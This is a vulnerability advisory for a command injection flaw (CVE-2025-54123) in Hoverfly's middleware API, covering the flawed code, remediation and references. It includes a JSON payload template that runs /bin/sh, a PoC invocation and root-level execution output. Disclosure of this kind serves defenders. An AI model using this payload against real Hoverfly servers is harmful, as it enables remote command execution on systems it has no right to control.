# CVE-2025-54123 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-54123
- **CWE ID**: CWE-78 (OS Command Injection)
- **Affected Software**: Hoverfly
- **Affected Versions**: <= 1.11.3
- **Fixed Version**: 1.12.0
- **CVSS Score**: 9.8 (Critical)

## Vulnerability Details

The middleware functionality in Hoverfly is vulnerable to command injection at the `/api/v2/hoverfly/middleware` endpoint. The vulnerability stems from three code-level flaws:

1. **Insufficient Input Validation** (`middleware.go` lines 94-96): The `SetBinary()` function directly sets the binary string without any validation.

2. **Unsafe Command Execution** (`local_middleware.go` lines 14-19): User-controlled binary and script are passed directly to `exec.Command()`.

3. **Immediate Execution During Testing** (`hoverfly_service.go` line 173): When middleware is set via API, it is immediately executed to test functionality.

## Attack Vector

An attacker can send a PUT request to `/api/v2/hoverfly/middleware` with a malicious payload:

```json
{
    "binary": "/bin/sh",
    "script": "#!/bin/sh\nmalicious_command_here\n...",
    "remote": ""
}
```

When Hoverfly receives this request, it:
1. Writes the script content to a temporary file
2. Immediately executes `/bin/sh <temp_script_file>` to test the middleware
3. The attacker's command is executed with Hoverfly process privileges

## Reproduction Steps

1. Start vulnerable Hoverfly instance (v1.11.3 or earlier)
2. Run the PoC script:
   ```bash
   python poc.py -t http://target:8888 -c "id > /tmp/pwned.txt"
   ```
3. Verify command execution:
   ```bash
   docker exec hoverfly-vulnerable cat /tmp/pwned.txt
   ```

## Verification Result

```
============================================================
CVE-2025-54123: Hoverfly Command Injection Exploit
============================================================
[*] Hoverfly Version: v1.11.3
[*] Target: http://127.0.0.1:8888
[*] Response Status: 200
[+] Exploit successful! Command was executed on the target.

--- Command Output ---
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
CVE-2025-54123-SUCCESS
```

## Impact

- **Remote Code Execution**: Attackers can execute arbitrary commands on the host system
- **Privilege Escalation**: Commands run with Hoverfly process privileges (often root in Docker)
- **Data Exfiltration**: Attackers can access sensitive data on the system
- **Reverse Shell**: Attackers can establish persistent access

## Remediation

- Upgrade to Hoverfly version 1.12.0 or later
- In v1.12.0, the middleware API is disabled by default
- Only enable with `-enable-middleware-api` flag when absolutely necessary
- Restrict network access to the Admin API (port 8888)

## References

- [GitHub Advisory](https://github.com/SpectoLabs/hoverfly/security/advisories)
- [Fix Commit](https://github.com/SpectoLabs/hoverfly/commit/17e60a9bc78826deb4b782dca1c1abd3dbe60d40)
